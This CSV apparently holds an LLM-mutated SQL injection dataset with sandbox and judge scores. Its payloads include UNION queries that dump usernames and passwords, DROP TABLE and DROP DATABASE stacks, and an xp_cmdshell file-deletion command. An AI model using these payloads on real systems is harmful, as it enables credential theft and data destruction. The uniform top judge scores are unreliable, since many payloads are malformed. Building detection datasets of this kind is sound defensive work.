query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00720,"' or 1=1 union select null,'admin',null,null--","SELECT * FROM orders WHERE status = '' or 1=1 union select null,'admin',null,null--' ORDER BY date DESC",stacked_queries,order_filter,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Null"", ""Table"", ""Union"", ""Where"", ""Select"", ""Or"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00721,'; exec sp_updatestats; --,SELECT * FROM orders WHERE status = ''; exec sp_updatestats; --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Semicolon"", ""Alias"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00723,'/* DROP DATABASE */; /**/,SELECT * FROM orders WHERE status = ''/* DROP DATABASE */; /**/' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00724,); EXEC master..xp_cmdshell('del C:\Windows\Temp\*.*'); GO,"INSERT INTO comments (user_id, body) VALUES (1, '); EXEC master..xp_cmdshell('del C:\Windows\Temp\*.*'); GO')",stacked_queries,comment_insert,1,0,0.0,True,tsql,"[""Paren"", ""Execute"", ""Schema"", ""From"", ""Star"", ""Table"", ""EQ"", ""Literal"", ""Where"", ""Select"", ""Command"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00725,"--'; DROP TABLE IF EXISTS users; --""","INSERT INTO comments (user_id, body) VALUES (1, '--'; DROP TABLE IF EXISTS users; --""')",stacked_queries,comment_insert,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00726,"AND (SELECT 1 FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END AS x FROM information_schema.tables WHERE table_name='users'))--""","INSERT INTO comments (user_id, body) VALUES (1, 'AND (SELECT 1 FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END AS x FROM information_schema.tables WHERE table_name='users'))--""')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Alias"", ""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Case"", ""If"", ""Select"", ""Where"", ""Subquery"", ""Identifier""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00730,"[""--/**/\nSELECT * FROM users WHERE username = '' OR 1=1 --"", ""#SELECT * FROM users WHERE username = '' OR 1=1;"", ""/*SELECT * FROM users WHERE username = \' OR 1=1*/"", ""\n;SELECT * FROM users WHERE username = '' OR 1=1--"", ""/**/--SELECT * FROM users WHERE username = '' OR 1=1""]","SELECT * FROM users WHERE username = '[""--/**/\nSELECT * FROM users WHERE username = '' OR 1=1 --"", ""#SELECT * FROM users WHERE username = '' OR 1=1;"", ""/*SELECT * FROM users WHERE username = \' OR 1=1*/"", ""\n;SELECT * FROM users WHERE username = '' OR 1=1--"", ""/**/--SELECT * FROM users WHERE username = '' OR 1=1""]' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""Array"", ""Identifier"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00731,"--
CASE WHEN 1=1 THEN 'x' ELSE (SELECT 'y') END","SELECT * FROM users WHERE username = '--
CASE WHEN 1=1 THEN 'x' ELSE (SELECT 'y') END' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""Literal"", ""EQ"", ""Case"", ""If"", ""Select"", ""Subquery""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00732,(SELECT * FROM users WHERE username = 'a' /**/ OR 1=1),SELECT * FROM users WHERE username = '(SELECT * FROM users WHERE username = 'a' /**/ OR 1=1)' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Or"", ""Subquery"", ""Identifier""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00733,///**/(SELECT 'z' FROM users WHERE 1=1),SELECT * FROM users WHERE username = '///**/(SELECT 'z' FROM users WHERE 1=1)' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,snowflake,[],True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00734,"--
(CASE WHEN 1=1 THEN 'x' ELSE (SELECT 'y') END)
--","SELECT * FROM users WHERE username = '--
(CASE WHEN 1=1 THEN 'x' ELSE (SELECT 'y') END)
--' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""Paren"", ""Literal"", ""EQ"", ""Case"", ""If"", ""Select"", ""Subquery""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00736,';-- DROP DATABASE;--,SELECT * FROM products WHERE name LIKE '%';-- DROP DATABASE;--%',comment_obfuscation,search,1,0,0.0,True,default,"[""Semicolon"", ""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00737,"# Hash Comment Bypass
SELECT * FROM products WHERE name LIKE '%' + '#'","SELECT * FROM products WHERE name LIKE '%# Hash Comment Bypass
SELECT * FROM products WHERE name LIKE '%' + '#'%'",comment_obfuscation,search,1,0,0.0,True,mysql,"[""Like"", ""Select"", ""From"", ""Column"", ""Star"", ""Literal"", ""Table"", ""Where"", ""Add"", ""Identifier""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00738,/* Encoded String */ SELECT * FROM products WHERE name LIKE '%' + CHAR(65),SELECT * FROM products WHERE name LIKE '%/* Encoded String */ SELECT * FROM products WHERE name LIKE '%' + CHAR(65)%',comment_obfuscation,search,1,0,0.0,True,default,"[""Like"", ""Chr"", ""Select"", ""From"", ""Column"", ""Star"", ""Literal"", ""Table"", ""Where"", ""Add"", ""Identifier""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00739,' OR '1'='1' /* SQL Injection via Comment */,SELECT * FROM products WHERE name LIKE '%' OR '1'='1' /* SQL Injection via Comment */%',comment_obfuscation,search,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Or"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00741,"/*'"" OR ""admin""=""admin */","SELECT * FROM users WHERE id = /*'"" OR ""admin""=""admin */",comment_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00742,"--' UNION SELECT NULL, NULL, NULL, NULL --","SELECT * FROM users WHERE id = --' UNION SELECT NULL, NULL, NULL, NULL --",comment_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00743,#' AND 1=1 /*,SELECT * FROM users WHERE id = #' AND 1=1 /*,comment_obfuscation,user_lookup,1,0,0.0,True,mysql,[],True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00744,' AND '1'='1'--,SELECT * FROM users WHERE id = ' AND '1'='1'--,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00746,--' OR --,SELECT * FROM users WHERE id = --' OR --,comment_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00750,x'/**/--(SELECT/**/1FROM(SELECT/**/NULL)xWHERE/**/1=1);#,SELECT * FROM users WHERE id = x'/**/--(SELECT/**/1FROM(SELECT/**/NULL)xWHERE/**/1=1);#,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00751,' OR /**/username/**/=/**/'admin'/**/-- AND /**/1=1/**/;,SELECT * FROM users WHERE id = ' OR /**/username/**/=/**/'admin'/**/-- AND /**/1=1/**/;,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Or"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00753,"/**/ 6701 = (SELECT ASCII('a')"")","SELECT * FROM orders WHERE status = '/**/ 6701 = (SELECT ASCII('a')"")' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,drill,"[""Alias"", ""Literal"", ""EQ"", ""Select"", ""Ascii"", ""Subquery"", ""Identifier""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00754,/* -- */ ' OR 1=1 /* -- */',SELECT * FROM orders WHERE status = '/* -- */ ' OR 1=1 /* -- */'' ORDER BY date DESC,comment_obfuscation,order_filter,1,0,0.0,True,default,"[""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00756,"--"")/*# ' OR status = (SELECT 1 FROM users)--""","SELECT * FROM orders WHERE status = '--"")/*# ' OR status = (SELECT 1 FROM users)--""' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00757,"#) OR status = 'active'--""","SELECT * FROM orders WHERE status = '#) OR status = 'active'--""' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00758,"--') OR status IN (SELECT 'pending', 'cancelled' FROM orders) --","SELECT * FROM orders WHERE status = '--') OR status IN (SELECT 'pending', 'cancelled' FROM orders) --' ORDER BY date DESC",comment_obfuscation,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00761,1'/*'XOR'*/'1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '1'/*'XOR'*/'1'='1')",comment_obfuscation,comment_insert,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Table"", ""Where"", ""Concat"", ""Select"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00762,1'#OR#'1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '1'#OR#'1'='1')",comment_obfuscation,comment_insert,1,0,0.0,True,mysql,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00764,"1'--UNION ALL SELECT NULL,NULL FROM information_schema.tables#","INSERT INTO comments (user_id, body) VALUES (1, '1'--UNION ALL SELECT NULL,NULL FROM information_schema.tables#')",comment_obfuscation,comment_insert,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""Literal"", ""EQ"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00767,-- 1' AND (SELECT COUNT() FROM users WHERE username='admin') > 0,"INSERT INTO comments (user_id, body) VALUES (1, '-- 1' AND (SELECT COUNT() FROM users WHERE username='admin') > 0')",comment_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00769,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,"[""From"", ""Column"", ""Star"", ""EQ"", ""Drop"", ""Literal"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00770,"' UNION SELECT NULL,NULL,CONCAT_WS(',',username,password),NULL FROM users--","SELECT * FROM users WHERE username = '' UNION SELECT NULL,NULL,CONCAT_WS(',',username,password),NULL FROM users--' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,default,"[""ConcatWs"", ""From"", ""Column"", ""Star"", ""EQ"", ""Literal"", ""Null"", ""Table"", ""Union"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00771,"[""%\' AND 1=1 --"", ""%\' OR 1=1 /*"", ""%\"") WAITFOR DELAY \'0:0:5\' --"", ""%\') UNION ALL SELECT NULL, NULL, CONCAT(username, password), NULL --"", ""%\"") AS admin WHERE 1=1 --""]","SELECT * FROM users WHERE username = '[""%\' AND 1=1 --"", ""%\' OR 1=1 /*"", ""%\"") WAITFOR DELAY \'0:0:5\' --"", ""%\') UNION ALL SELECT NULL, NULL, CONCAT(username, password), NULL --"", ""%\"") AS admin WHERE 1=1 --""]' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,default,"[""From"", ""Column"", ""And"", ""EQ"", ""Literal"", ""Star"", ""Table"", ""Where"", ""Select"", ""Identifier""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00772,"' AND (SELECT HEX(MID((SELECT GROUP_CONCAT(password ORDER BY id SEPARATOR ',') FROM users), 1, 8)))--","SELECT * FROM users WHERE username = '' AND (SELECT HEX(MID((SELECT GROUP_CONCAT(password ORDER BY id SEPARATOR ',') FROM users), 1, 8)))--' AND password = 'anything'",encoding_obfuscation,login,1,0,0.0,True,mysql,"[""Anonymous"", ""From"", ""Column"", ""And"", ""EQ"", ""GroupConcat"", ""Hex"", ""Literal"", ""Order"", ""Star"", ""Select"", ""Table"", ""Where"", ""Ordered"", ""Subquery"", ""Identifier""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
